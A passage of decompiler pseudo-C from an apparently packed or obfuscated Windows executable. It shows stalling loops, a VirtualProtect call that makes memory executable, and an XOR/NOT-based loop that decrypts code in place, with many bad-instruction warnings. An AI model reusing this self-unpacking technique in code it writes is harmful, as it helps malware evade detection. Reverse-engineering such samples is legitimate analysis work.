    _DAT_00435676 = extraout_ECX_08;
    _DAT_00436701 = extraout_ECX_08;
    s___AVbad_alloc_std___00436818._2_4_ = pvVar20;
    *puVar18 = ~*puVar18;
    _DAT_0043509a = extraout_ECX_08;
    _DAT_00435428 = uVar25;
    _DAT_00435b40 = extraout_ECX_08;
    _DAT_004366c9 = uVar25;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_00435270 = -((uint)PTR_PTR_FUN_00436618 >> 0x15 | uVar17 * -0x800);
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_00435be8 = pvVar20;
    _DAT_004366e3 = PTR_PTR_FUN_00436618;
    s___AVout_of_range_std___00436950._16_4_ = extraout_ECX_08;
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_004354c0 = ~(uint)extraout_ECX_08;
    uVar11 = (int)pvVar20 << 0x10;
    _DAT_004354b4 = uVar11 >> 0x12 | ((uint)pvVar20 >> 0x10 | uVar11) << 0xe;
    uVar31 = (uint)pvVar20 & 0xffff0000;
    _DAT_00435152 = pvVar20;
    *puVar18 = ~*puVar18;
    uVar26 = ((uVar26 ^ uVar25) + uVar25 ^ uVar25) - uVar25;
    PTR_DAT_00435224 = (undefined *)(uVar26 ^ 0xe895174);
    pvVar20 = (LPVOID)((uint)pvVar20 & 0x3f | uVar31 | (uVar11 & 0xffc00000) >> 0x10);
    puVar18 = puVar18 + 1;
    uVar26 = ((uVar26 + uVar25 ^ uVar25) - uVar25) - 4;
  } while (uVar26 != 0);
  uVar33 = SUB42(puVar18,0);
  uVar26 = in(uVar33);
  bVar35 = (unaff_ESI & 0x400) != 0;
  uVar10 = uVar26 & 0xffffff00 | (uint)(byte)((char)uVar26 + 0xba);
  uVar17 = (uint)(byte)((char)(uVar11 >> 0x18) - 0x22);
  uVar25 = (uint)CONCAT11((char)(PTR_PTR_FUN_00436618 + -0x29abeefc) + -8,(char)pvVar20);
  uVar21 = uVar31 | uVar25;
  uVar11 = (uint)(PTR_PTR_FUN_00436618 + -0x29abeefc) & 0xffffff00 | 0xa4;
  _DAT_00435dd0 = extraout_ECX_08;
  while( true ) {
    puVar24 = (undefined *)(uVar17 & 0xffffff00 | (uint)(byte)((char)uVar17 + 0x78));
    uVar5 = uVar11 & 0xffffff00 | (uint)DAT_3bdecebe;
    puVar2 = (uint *)(puVar24 + uVar5 + 0x9d9390fc);
    uVar11 = (uint)(0xf < (byte)((char)uVar11 + 0x18U));
    uVar17 = *puVar2;
    bVar36 = CARRY4((uint)(puVar24 + *puVar2),uVar11);
    *puVar2 = (uint)(puVar24 + *puVar2 + uVar11);
    bVar34 = *puVar2 == 0;
    uVar19 = in(uVar33);
    *puVar24 = uVar19;
    bVar6 = (byte)((short)((short)register0x00000010 + -3) / (short)*(char *)(uVar21 - 0x5a));
    if (bVar34) {
      puVar18 = (uint *)(extraout_ECX_08 + -0x7fc85b0a);
      *puVar18 = *puVar18 << 1 | (uint)((int)*puVar18 < 0);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    bVar22 = (byte)(uVar25 >> 8);
    if ((!CARRY4(uVar17,(uint)puVar24) && !bVar36) && !bVar34) break;
    do {
    } while (CARRY4(uVar17,(uint)puVar24) || bVar36);
    uVar17 = (uint)((longlong)*(int *)(puVar24 + (uint)bVar35 * -2 + -0x40918689) * 0x1ae4686f);
    bVar6 = in(0xf1);
    uVar11 = (uint)auStackY256 & 0xffff0000 |
             (uint)(ushort)((short)((short)register0x00000010 + -3) %
                            (short)*(char *)(uVar21 - 0x5a) << 8) | (uint)bVar6;
    if ((longlong)(int)uVar17 !=
        (longlong)*(int *)(puVar24 + (uint)bVar35 * -2 + -0x40918689) * 0x1ae4686f || bVar34) {
      do {
        do {
          cVar9 = (char)((uint)puVar18 >> 8);
        } while (cVar9 < (char)bVar22);
        bVar36 = SBORROW1(cVar9,bVar22);
        bVar35 = (char)(cVar9 - bVar22) < '\0';
        while (bVar36 == bVar35) {
          bVar6 = (byte)((uint)puVar18 >> 8);
          while( true ) {
            if (bVar6 != bVar22) {
              if (SBORROW1(bVar6,bVar22)) {
                    // WARNING: Bad instruction - Truncating control flow here
                halt_baddata();
              }
              do {
                    // WARNING: Do nothing block with infinite loop
              } while( true );
            }
            bVar36 = false;
            bVar6 = (byte)((uint)puVar18 >> 8) & bVar22;
            puVar18 = (uint *)((uint)bVar6 << 8);
            bVar35 = (short)((ushort)bVar6 << 8) < 0;
            if (!bVar35) break;
            if ((char)bVar22 <= (char)bVar6) {
                    // WARNING: Bad instruction - Truncating control flow here
              halt_baddata();
            }
          }
        }
      } while( true );
    }
  }
  if (SBORROW1((char)((uint)puVar18 >> 8),bVar22)) {
    in(uVar33);
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  pbVar1 = (byte *)(uVar10 + uVar21 * 8);
  *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
  *(undefined4 *)(&stack0xfffffffc + uVar10) = 0xde04c515;
  pbVar1 = (byte *)(uVar10 + uVar21 * 8);
  *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
  uVar3 = *(undefined6 *)(uVar10 + uVar21 * 8);
  pbVar1 = (byte *)(uVar10 + uVar21 * 8);
  *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
  *(undefined4 *)(extraout_ECX_08 + uVar21 * 8) = 0xde04c687;
  puVar18 = (uint *)((uint)uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 - 0x22));
  uVar25 = (uVar26 & 0xffffff00 | (uint)(byte)((char)uVar26 + 0x98)) + 4 + (uint)bVar35 * -8;
  puVar27 = (undefined4 *)
            (((uint)auStackY256 & 0xffff0000 | (uint)(bVar6 / 0xde) << 8 |
             (uint)(byte)(bVar6 % 0xde - 0x27)) + 4 + (uint)bVar35 * -8);
  puVar27[uVar21 * 2] = 0xde04c60b;
  uVar17 = *puVar18;
  *puVar18 = uVar25 & 0xffffff00 | (uint)(byte)((char)uVar25 - 0x24);
  *(uint **)(uVar5 - 4) = puVar18;
  uVar17 = uVar17 + 0x45787de & 0xffffff00 | (uint)(byte)((char)(uVar17 + 0x45787de) - 0x22);
  puVar13 = puVar27 + uVar21 * 2;
  *(byte *)puVar13 = *(char *)puVar13 << 7 | *(byte *)puVar13 >> 1;
  *(undefined4 *)((int)puVar27 + (int)&stack0xfffffffc * 2) = 0x7e04c786;
  uVar3 = *(undefined6 *)((uVar5 - 4) + (int)&stack0xfffffffc * 4);
  cVar9 = (char)uVar3;
  iVar16 = (uint)CONCAT21((short)((uint)extraout_ECX_08 >> 0x10),
                          (char)((uint)extraout_ECX_08 >> 8) - cVar9) << 8;
  uVar31 = uVar31 | CONCAT11(bVar22 + 8,(char)pvVar20);
  cVar9 = cVar9 + 'B';
  uVar14 = (int3)((uint6)uVar3 >> 8);
  do {
    do {
      cVar7 = cVar9;
      puVar27[uVar31 * 2] = 0xde04c787;
      cVar8 = (char)uVar17;
      out(0xc6,uVar17 & 0xffffff00 | (uint)(byte)(cVar8 + 0xbc));
      uVar19 = (undefined)uVar31;
      uVar25 = uVar31 & 0xffff0000;
      uVar3 = *(undefined6 *)(puVar27 + CONCAT31(uVar14,cVar7 + '\x12') * 2);
      uVar33 = (undefined2)((uint6)uVar3 >> 0x20);
      uVar26 = (uint)CONCAT11((char)uVar3,uVar19);
      uVar31 = uVar25 | uVar26;
      uVar15 = (undefined3)((uint6)uVar3 >> 8);
      uVar17 = CONCAT31(uVar14,cVar7 + -0x54);
      cVar9 = cVar8 + -0x10;
      uVar14 = uVar15;
    } while (cVar9 == '\0');
  } while (SCARRY1(cVar8 + -0x60,'P') != cVar9 < '\0');
  uVar17 = uVar25 | CONCAT11(cVar9,uVar19);
  pcVar12 = (char *)CONCAT31(uVar15,(char)(uVar26 >> 8) + 'P');
  *(undefined2 *)(uVar5 - 8) = in_ES;
  *(undefined *)(puVar27 + uVar17 * 2) = 0x97;
  puVar13 = puVar27 + uVar17 * 2;
  *(byte *)puVar13 = *(char *)puVar13 << 3 | *(byte *)puVar13 >> 5;
  puVar13 = puVar27 + uVar17 * 2;
  *(byte *)puVar13 = *(char *)puVar13 << 3 | *(byte *)puVar13 >> 5;
  *(undefined *)(puVar27 + uVar17 * 2) = 0x87;
  puVar27[uVar17 * 2] = 0xde04c787;
  uVar25 = uVar25 | CONCAT11((char)((uint)CONCAT11(cVar9,uVar19) >> 8) + -0x5c,uVar19);
  puVar32 = (undefined4 *)(pcVar12 + (uint)bVar35 * -2 + 1);
  *pcVar12 = cVar7 + 'j';
  puVar13 = puVar32 + (uint)bVar35 * -2 + 1;
  puVar28 = puVar27 + (uint)bVar35 * -2 + 1;
  *puVar32 = *puVar27;
  do {
    *(undefined2 *)(puVar23 + -0x3a) = uVar33;
    uVar3 = *(undefined6 *)(puVar28 + uVar25 * 2);
    uVar26 = (uint)uVar3;
    puVar27 = puVar28 + uVar26 * 2;
    *(byte *)puVar27 = *(char *)puVar27 << 7 | *(byte *)puVar27 >> 1;
    cVar9 = (char)*(undefined6 *)(puVar28 + uVar26 * 2);
    uVar17 = (uint)*(undefined6 *)(puVar28 + uVar26 * 2) & 0xffffff00;
    uVar19 = (undefined)uVar3;
    uVar26 = uVar26 & 0xffff0000;
    uVar25 = uVar26 | CONCAT11((char)puVar13 + -4,uVar19);
    uVar4 = *(undefined6 *)(((uint)puVar13 & 0xffffff00 | (uint)(byte)((uint6)uVar3 >> 8)) + 100);
    in(0x78);
    *(char *)((int)puVar28 + -0x546dfb39) = *(char *)((int)puVar28 + -0x546dfb39) + '\x01';
    puVar13 = puVar28 + uVar25 * 2;
    *(byte *)puVar13 = *(char *)puVar13 << 7 | *(byte *)puVar13 >> 1;
    uVar3 = *(undefined6 *)(puVar28 + uVar25 * 2);
    uVar33 = (undefined2)((uint6)uVar3 >> 0x20);
    puVar28[uVar25 * 2] = 0xde04c51b;
    iVar16 = CONCAT31((int3)((uint)iVar16 >> 8),0x76);
    out(0xc6,uVar17 | (byte)(cVar9 + 0xb8));
    uVar17 = uVar17 | (byte)(cVar9 + 0x96) | (uint)puVar28;
    bVar6 = (byte)uVar17;
    uVar17 = uVar17 & 0xffffff00;
    puVar23 = puVar23 + (uint)(0x21 < bVar6) + (uVar17 | (byte)(bVar6 - 0x22));
    puVar13 = (undefined4 *)(uVar17 | (byte)(bVar6 + 0x9a));
    bVar35 = 0xe1 < (byte)((char)uVar3 + 0xbcU);
    uVar17 = (uint)CONCAT11((char)uVar3 + -0x26,uVar19);
    uVar25 = uVar26 | uVar17;
    pcVar12 = (char *)(iVar16 + 0x78);
    cVar9 = *pcVar12;
    cVar7 = *pcVar12;
    *pcVar12 = cVar7 + '~' + bVar35;
  } while ((SCARRY1(cVar9,'~') != SCARRY1(cVar7 + '~',bVar35)) != *pcVar12 < '\0');
  cVar9 = (char)(uVar17 >> 8);
  uVar17 = ((uint)uVar3 & 0xffffff00 | (uint)(byte)(cVar9 + 0x9a)) + 0x87de04c5 +
           (uint)(0x21 < (byte)(cVar9 + 0xbcU));
  puVar28[(uVar26 | CONCAT11(0xc0,uVar19)) * 2] = 0xde04c787;
  puVar28[(uVar26 | CONCAT11((char)((uint)CONCAT11(0xc0,uVar19) >> 8) + '$',uVar19)) * 2] =
       0xde04c787;
  return CONCAT44((int)uVar4,uVar17 & 0xffffff00 | (uint)(byte)((char)uVar17 + 0xbf));
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x0041b3e7) overlaps instruction at (ram,0x0041b3e6)
// 
// WARNING: Unable to track spacebase fully for stack
// WARNING: Removing unreachable block (ram,0x0041aa75)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_0041a954(void)

{
  byte *pbVar1;
  uint *puVar2;
  undefined6 uVar3;
  undefined6 uVar4;
  uint uVar5;
  byte bVar6;
  char cVar7;
  char cVar8;
  char cVar9;
  uint uVar10;
  uint uVar11;
  undefined3 uVar14;
  undefined3 uVar15;
  char *pcVar12;
  undefined4 *puVar13;
  undefined4 extraout_ECX;
  int iVar16;
  undefined4 extraout_ECX_00;
  int extraout_ECX_01;
  int extraout_ECX_02;
  int extraout_ECX_03;
  uint uVar17;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined *extraout_ECX_08;
  int extraout_EDX;
  uint *puVar18;
  undefined uVar19;
  byte bVar22;
  LPVOID pvVar20;
  uint uVar21;
  uint unaff_EBP;
  undefined *puVar23;
  uint uVar24;
  uint uVar25;
  undefined4 *puVar26;
  undefined4 *puVar27;
  undefined *unaff_EDI;
  int iVar28;
  int iVar29;
  uint uVar30;
  undefined4 *puVar31;
  undefined2 in_ES;
  undefined2 uVar32;
  bool bVar33;
  bool bVar34;
  bool bVar35;
  undefined8 uVar36;
  uint unaff_retaddr;
  LPVOID lpAddress;
  SIZE_T dwSize;
  DWORD flNewProtect;
  PDWORD lpflOldProtect;
  
  FUN_00406ac1();
  FUN_00409297(extraout_ECX);
  func_0x00409510();
  iVar16 = 0xa7618c6;
  do {
    iVar28 = iVar16;
    iVar16 = iVar28 + -1;
  } while (iVar16 != 0);
  FUN_00404a04(iVar28 + -0x83cae59);
  iVar16 = 0xe75d681;
  do {
    _DAT_00435d0c = iVar16;
    iVar28 = DAT_00435e00 + 1;
    iVar16 = _DAT_00435d0c + -1;
  } while (_DAT_00435d0c + -1 != 0);
  PTR_DAT_0043528c = unaff_EDI;
  _DAT_00435d22 = _DAT_00435d0c;
  FUN_00408dc4();
  func_0x004012e7();
  uVar36 = FUN_00404532();
  puVar23 = &stack0x00000000 + (uint)((ulonglong)uVar36 >> 0x37) + (int)uVar36;
  _DAT_0043599d = extraout_ECX_00;
  FUN_00406ac1();
  _DAT_004366c9 = _DAT_004366c9 & 0xff | extraout_ECX_01 << 8;
  uRam004366cd = (undefined)((uint)extraout_ECX_01 >> 0x18);
  do {
    iVar29 = iVar28;
    FUN_00408dc4();
    iVar16 = DAT_0043590c;
    puVar23 = (undefined *)((uint)((int)puVar23 << 1) >> 0x11);
    s___AVlogic_error_std___00436910._19_4_ = extraout_ECX_02;
    iVar28 = iVar29 + -1;
  } while ((undefined *)(extraout_ECX_02 + -1) != (undefined *)0x0);
  lpflOldProtect = (PDWORD)&DAT_00435413;
  flNewProtect = 0x40;
  _DAT_00435e7d = DAT_0043551c;
  PTR_s_Monday_004359c8 = (undefined *)(extraout_ECX_02 + -1);
  PTR_DAT_00436280 = puVar23;
  func_0x00409510();
  FUN_00408dc4();
  uVar30 = (iVar29 + -3) - (DAT_0043644e << 0x15 | DAT_0043644e >> 0xb);
  iVar28 = iVar16 + 1;
  _DAT_004364cb = 0xc1f0;
  FUN_0040473c();
  uVar17 = extraout_ECX_03 + iVar28;
  _DAT_004350cc = uVar17 ^ 0xe0e4c61;
  _DAT_00435218 = uVar17 - iVar28;
  uVar17 = iVar16 - 1;
  dwSize = _DAT_00435218;
  FUN_004051e8();
  _DAT_004359f3 = extraout_ECX_04;
  FUN_00408aea();
  _DAT_00436252 = uVar17 >> 8 | uVar17 * 0x1000000;
  FUN_0040667f();
  uVar17 = 0x41abd0;
  unique0x10000c9b = extraout_ECX_05;
  FUN_0040786e();
  FUN_00404dd1();
  FUN_00405baf();
  _DAT_00435de0 = uVar17 >> 1 | uVar17 << 0x1f;
  func_0x00408525();
  pvVar20 = (LPVOID)(uVar17 + 0x1a3);
  FUN_0040514f();
  _DAT_0043532e = extraout_ECX_06;
  FUN_00401433();
  _DAT_00435bda = extraout_ECX_07;
  _DAT_00435cd4 = (int)pvVar20 * 0x8000 | (uint)pvVar20 >> 0x11;
  iVar16 = FUN_00401e0b();
  lpAddress = pvVar20;
  func_0x004079b4();
  FUN_00403b27();
  FUN_004027cc();
  VirtualProtect(lpAddress,dwSize,flNewProtect,lpflOldProtect);
  uVar24 = ~((iVar16 - ((uVar30 >> 7 | uVar30 * 0x2000000) >> 0xb | (uVar30 >> 7) << 0x15)) - 1) ^
           (uint)pvVar20;
  _DAT_004353ac = uVar30;
  _DAT_00436144 = uVar30;
  func_0x00409510();
  s_abcdefghijklmnopqrstuvwxyz_004355a9._7_4_ =
       (uint)extraout_ECX_08 >> 9 | (int)extraout_ECX_08 << 0x17;
  _DAT_00435d7a = (undefined *)-DAT_00435580;
  _DAT_0043608e = (extraout_EDX + unaff_EBP) - 0x5da82c ^ unaff_EBP;
  uVar17 = (uint)(DAT_00435580 * -0x80) >> 7;
  PTR_PTR_FUN_00436618 = (undefined *)-((uint)_DAT_00435d7a & 0xfe000000 | uVar17);
  uVar25 = 0xbc04;
  _DAT_00435128 = 0x41addf;
  puVar18 = (uint *)0x41b35e;
  _DAT_00435171 = uVar30;
  _DAT_00435966 = extraout_ECX_08;
  PTR_s_August_00435a2c = extraout_ECX_08;
  _DAT_00435df3 = pvVar20;
  _DAT_00435e06 = extraout_ECX_08;
  _DAT_00435e87 = pvVar20;
  PTR_DAT_00435ec0 = _DAT_00435d7a;
  _DAT_00436152 = extraout_ECX_08;
  _DAT_00436178 = extraout_ECX_08;
  _DAT_004367da = extraout_ECX_08;
  do {
    _DAT_00435290 = extraout_ECX_08;
    *puVar18 = ~*puVar18;
    _DAT_004353bf = (uVar25 ^ uVar24) - uVar24;
    uVar25 = _DAT_004353bf + uVar24;
    _DAT_00435920 = _DAT_004353bf;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._48_4_ = PTR_PTR_FUN_00436618;
    unique0x10000d63 = puVar18;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_0043575d = (uint)pvVar20 >> 0x18 | (int)pvVar20 << 8;
    DAT_00435320 = PTR_PTR_FUN_00436618;
    _DAT_00435b50 = _DAT_0043575d;
    *puVar18 = *puVar18 + 0xa3432f62;
    _DAT_0043504c = ~(uint)pvVar20;
    _DAT_0043548d = puVar18;
    _DAT_00435570 = PTR_PTR_FUN_00436618;
    _DAT_00435876 = PTR_PTR_FUN_00436618;
    _DAT_00435960 = extraout_ECX_08;
    unique0x10000cf7 = extraout_ECX_08;
    _DAT_00436293 = extraout_ECX_08;
    _DAT_004367a7 = pvVar20;
    *puVar18 = ~*puVar18;
    PTR_u_dddd__MMMM_dd__yyyy_00435b00 =
         (undefined *)((uint)PTR_PTR_FUN_00436618 ^ unaff_EBP ^ 0x113c0b62);
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_00435585 = extraout_ECX_08;
    PTR_u_Saturday_00435a90 = PTR_PTR_FUN_00436618;
    s_Copyright__c__1992_2004_by_P_J__P_00436320._87_4_ = extraout_ECX_08;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_004369a6 = (uint)extraout_ECX_08 ^ (uint)puVar18;
    _DAT_00436452 = extraout_ECX_08;
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_0043578c = (uint)(puVar18 + -0x504dea) ^ 0x71363b2;
    _DAT_00435676 = extraout_ECX_08;
    _DAT_00436701 = extraout_ECX_08;
    s___AVbad_alloc_std___00436818._2_4_ = pvVar20;
    *puVar18 = ~*puVar18;
    _DAT_0043509a = extraout_ECX_08;
    _DAT_00435428 = uVar24;
    _DAT_00435b40 = extraout_ECX_08;
    _DAT_004366c9 = uVar24;
    *puVar18 = *puVar18 ^ 0xa3432f62;
    _DAT_00435270 = -((uint)PTR_PTR_FUN_00436618 >> 0x15 | uVar17 * -0x800);
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_00435be8 = pvVar20;
    _DAT_004366e3 = PTR_PTR_FUN_00436618;
    s___AVout_of_range_std___00436950._16_4_ = extraout_ECX_08;
    *puVar18 = *puVar18 + 0x5cbcd09e;
    _DAT_004354c0 = ~(uint)extraout_ECX_08;
    uVar11 = (int)pvVar20 << 0x10;
    _DAT_004354b4 = uVar11 >> 0x12 | ((uint)pvVar20 >> 0x10 | uVar11) << 0xe;
    uVar30 = (uint)pvVar20 & 0xffff0000;
    _DAT_00435152 = pvVar20;
    *puVar18 = ~*puVar18;
    uVar25 = ((uVar25 ^ uVar24) + uVar24 ^ uVar24) - uVar24;
    PTR_DAT_00435224 = (undefined *)(uVar25 ^ 0xe895174);
    pvVar20 = (LPVOID)((uint)pvVar20 & 0x3f | uVar30 | (uVar11 & 0xffc00000) >> 0x10);
    puVar18 = puVar18 + 1;
    uVar25 = ((uVar25 + uVar24 ^ uVar24) - uVar24) - 4;
  } while (uVar25 != 0);
  uVar32 = SUB42(puVar18,0);
  uVar25 = in(uVar32);
  bVar34 = (unaff_retaddr & 0x400) != 0;
  uVar10 = uVar25 & 0xffffff00 | (uint)(byte)((char)uVar25 + 0xba);
  uVar17 = (uint)(byte)((char)(uVar11 >> 0x18) - 0x22);
  uVar24 = (uint)CONCAT11((char)(PTR_PTR_FUN_00436618 + -0x29abeefc) + -8,(char)pvVar20);
  uVar21 = uVar30 | uVar24;
  uVar11 = (uint)(PTR_PTR_FUN_00436618 + -0x29abeefc) & 0xffffff00 | 0xa4;
  _DAT_00435dd0 = extraout_ECX_08;
  do {
    puVar23 = (undefined *)(uVar17 & 0xffffff00 | (uint)(byte)((char)uVar17 + 0x78));
    uVar5 = uVar11 & 0xffffff00 | (uint)DAT_3bdecebe;
    puVar2 = (uint *)(puVar23 + uVar5 + 0x9d9390fc);
    uVar11 = (uint)(0xf < (byte)((char)uVar11 + 0x18U));
    uVar17 = *puVar2;
    bVar35 = CARRY4((uint)(puVar23 + *puVar2),uVar11);
    *puVar2 = (uint)(puVar23 + *puVar2 + uVar11);
    bVar33 = *puVar2 == 0;
    uVar19 = in(uVar32);
    *puVar23 = uVar19;
    bVar6 = (byte)((short)((short)register0x00000010 + 5) / (short)*(char *)(uVar21 - 0x5a));
    if (bVar33) {
      puVar18 = (uint *)(extraout_ECX_08 + -0x7fc85b0a);
      *puVar18 = *puVar18 << 1 | (uint)((int)*puVar18 < 0);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    bVar22 = (byte)(uVar24 >> 8);
    if ((!CARRY4(uVar17,(uint)puVar23) && !bVar35) && !bVar33) {
      if (SBORROW1((char)((uint)puVar18 >> 8),bVar22)) {
        in(uVar32);
                    // WARNING: Bad instruction - Truncating control flow here
        halt_baddata();
      }
      pbVar1 = (byte *)(uVar10 + uVar21 * 8);
      *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
      *(undefined4 *)(uVar10 + unaff_EBP) = 0xde04c515;
      pbVar1 = (byte *)(uVar10 + uVar21 * 8);
      *pbVar1 = *pbVar1 << 7 | *pbVar1 >> 1;
      uVar3 = *(undefined6 *)(uVar10 + uVar21 * 8);
      pbVar1 = (byte *)(uVar10 + uVar21 * 8);
      *pbVar1 = *pbVar1 << 5 | *pbVar1 >> 3;
      *(undefined4 *)(extraout_ECX_08 + uVar21 * 8) = 0xde04c687;
      puVar18 = (uint *)((uint)uVar3 & 0xffffff00 | (uint)(byte)((char)uVar3 - 0x22));
      uVar24 = (uVar25 & 0xffffff00 | (uint)(byte)((char)uVar25 + 0x98)) + 4 + (uint)bVar34 * -8;
      puVar26 = (undefined4 *)
                (((uint)register0x00000010 & 0xffff0000 | (uint)(bVar6 / 0xde) << 8 |
                 (uint)(byte)(bVar6 % 0xde - 0x27)) + 4 + (uint)bVar34 * -8);
      puVar26[uVar21 * 2] = 0xde04c60b;
      uVar17 = *puVar18;
      *puVar18 = uVar24 & 0xffffff00 | (uint)(byte)((char)uVar24 - 0x24);
      *(uint **)(uVar5 - 4) = puVar18;
      uVar17 = uVar17 + 0x45787de & 0xffffff00 | (uint)(byte)((char)(uVar17 + 0x45787de) - 0x22);
      puVar13 = puVar26 + uVar21 * 2;
      *(byte *)puVar13 = *(char *)puVar13 << 7 | *(byte *)puVar13 >> 1;
      *(undefined4 *)((int)puVar26 + unaff_EBP * 2) = 0x7e04c786;
      uVar3 = *(undefined6 *)((uVar5 - 4) + unaff_EBP * 4);
      cVar9 = (char)uVar3;
      iVar16 = (uint)CONCAT21((short)((uint)extraout_ECX_08 >> 0x10),
                              (char)((uint)extraout_ECX_08 >> 8) - cVar9) << 8;
      uVar30 = uVar30 | CONCAT11(bVar22 + 8,(char)pvVar20);
      cVar9 = cVar9 + 'B';
      uVar14 = (int3)((uint6)uVar3 >> 8);
      do {
        do {
          cVar7 = cVar9;
          puVar26[uVar30 * 2] = 0xde04c787;
          cVar8 = (char)uVar17;
          out(0xc6,uVar17 & 0xffffff00 | (uint)(byte)(cVar8 + 0xbc));
          uVar19 = (undefined)uVar30;
          uVar24 = uVar30 & 0xffff0000;
          uVar3 = *(undefined6 *)(puVar26 + CONCAT31(uVar14,cVar7 + '\x12') * 2);
          uVar32 = (undefined2)((uint6)uVar3 >> 0x20);
          uVar25 = (uint)CONCAT11((char)uVar3,uVar19);
          uVar30 = uVar24 | uVar25;
          uVar15 = (undefined3)((uint6)uVar3 >> 8);
          uVar17 = CONCAT31(uVar14,cVar7 + -0x54);
          cVar9 = cVar8 + -0x10;
          uVar14 = uVar15;
        } while (cVar9 == '\0');
      } while (SCARRY1(cVar8 + -0x60,'P') != cVar9 < '\0');
      uVar17 = uVar24 | CONCAT11(cVar9,uVar19);
      pcVar12 = (char *)CONCAT31(uVar15,(char)(uVar25 >> 8) + 'P');
      *(undefined2 *)(uVar5 - 8) = in_ES;
      *(undefined *)(puVar26 + uVar17 * 2) = 0x97;
      puVar13 = puVar26 + uVar17 * 2;
      *(byte *)puVar13 = *(char *)puVar13 << 3 | *(byte *)puVar13 >> 5;
      puVar13 = puVar26 + uVar17 * 2;
      *(byte *)puVar13 = *(char *)puVar13 << 3 | *(byte *)puVar13 >> 5;
      *(undefined *)(puVar26 + uVar17 * 2) = 0x87;
      puVar26[uVar17 * 2] = 0xde04c787;
      uVar24 = uVar24 | CONCAT11((char)((uint)CONCAT11(cVar9,uVar19) >> 8) + -0x5c,uVar19);
      puVar31 = (undefined4 *)(pcVar12 + (uint)bVar34 * -2 + 1);
      *pcVar12 = cVar7 + 'j';
      puVar13 = puVar31 + (uint)bVar34 * -2 + 1;
      puVar27 = puVar26 + (uint)bVar34 * -2 + 1;
      *puVar31 = *puVar26;
      do {
        *(undefined2 *)(unaff_EBP - 0x3a) = uVar32;
        uVar3 = *(undefined6 *)(puVar27 + uVar24 * 2);
        uVar25 = (uint)uVar3;
        puVar26 = puVar27 + uVar25 * 2;
        *(byte *)puVar26 = *(char *)puVar26 << 7 | *(byte *)puVar26 >> 1;
        cVar9 = (char)*(undefined6 *)(puVar27 + uVar25 * 2);
        uVar17 = (uint)*(undefined6 *)(puVar27 + uVar25 * 2) & 0xffffff00;
        uVar19 = (undefined)uVar3;
        uVar25 = uVar25 & 0xffff0000;
        uVar24 = uVar25 | CONCAT11((char)puVar13 + -4,uVar19);
        uVar4 = *(undefined6 *)
                 (((uint)puVar13 & 0xffffff00 | (uint)(byte)((uint6)uVar3 >> 8)) + 100);
        in(0x78);
        *(char *)((int)puVar27 + -0x546dfb39) = *(char *)((int)puVar27 + -0x546dfb39) + '\x01';
        puVar13 = puVar27 + uVar24 * 2;
        *(byte *)puVar13 = *(char *)puVar13 << 7 | *(byte *)puVar13 >> 1;
        uVar3 = *(undefined6 *)(puVar27 + uVar24 * 2);
        uVar32 = (undefined2)((uint6)uVar3 >> 0x20);
        puVar27[uVar24 * 2] = 0xde04c51b;
        iVar16 = CONCAT31((int3)((uint)iVar16 >> 8),0x76);
        out(0xc6,uVar17 | (byte)(cVar9 + 0xb8));
        uVar17 = uVar17 | (byte)(cVar9 + 0x96) | (uint)puVar27;
        bVar6 = (byte)uVar17;
        uVar17 = uVar17 & 0xffffff00;
        unaff_EBP = unaff_EBP + (uVar17 | (byte)(bVar6 - 0x22)) + (uint)(0x21 < bVar6);
        puVar13 = (undefined4 *)(uVar17 | (byte)(bVar6 + 0x9a));
        bVar34 = 0xe1 < (byte)((char)uVar3 + 0xbcU);
        uVar17 = (uint)CONCAT11((char)uVar3 + -0x26,uVar19);
        uVar24 = uVar25 | uVar17;
        pcVar12 = (char *)(iVar16 + 0x78);
        cVar9 = *pcVar12;
        cVar7 = *pcVar12;
        *pcVar12 = cVar7 + '~' + bVar34;
      } while ((SCARRY1(cVar9,'~') != SCARRY1(cVar7 + '~',bVar34)) != *pcVar12 < '\0');
      cVar9 = (char)(uVar17 >> 8);
      uVar17 = ((uint)uVar3 & 0xffffff00 | (uint)(byte)(cVar9 + 0x9a)) + 0x87de04c5 +
               (uint)(0x21 < (byte)(cVar9 + 0xbcU));
      puVar27[(uVar25 | CONCAT11(0xc0,uVar19)) * 2] = 0xde04c787;
      puVar27[(uVar25 | CONCAT11((char)((uint)CONCAT11(0xc0,uVar19) >> 8) + '$',uVar19)) * 2] =
           0xde04c787;
      return CONCAT44((int)uVar4,uVar17 & 0xffffff00 | (uint)(byte)((char)uVar17 + 0xbf));
    }
    do {
    } while (CARRY4(uVar17,(uint)puVar23) || bVar35);
    uVar17 = (uint)((longlong)*(int *)(puVar23 + (uint)bVar34 * -2 + -0x40918689) * 0x1ae4686f);
    bVar6 = in(0xf1);
    uVar11 = (uint)register0x00000010 & 0xffff0000 |
             (uint)(ushort)((short)((short)register0x00000010 + 5) % (short)*(char *)(uVar21 - 0x5a)
                           << 8) | (uint)bVar6;
  } while ((longlong)(int)uVar17 ==
           (longlong)*(int *)(puVar23 + (uint)bVar34 * -2 + -0x40918689) * 0x1ae4686f && !bVar33);
  do {
    *(uint *)(unaff_EBP - 10) = *(uint *)(unaff_EBP - 10) ^ uVar11;
    do {
      cVar9 = (char)((uint)puVar18 >> 8);
      if (cVar9 < (char)bVar22) break;
      bVar35 = SBORROW1(cVar9,bVar22);
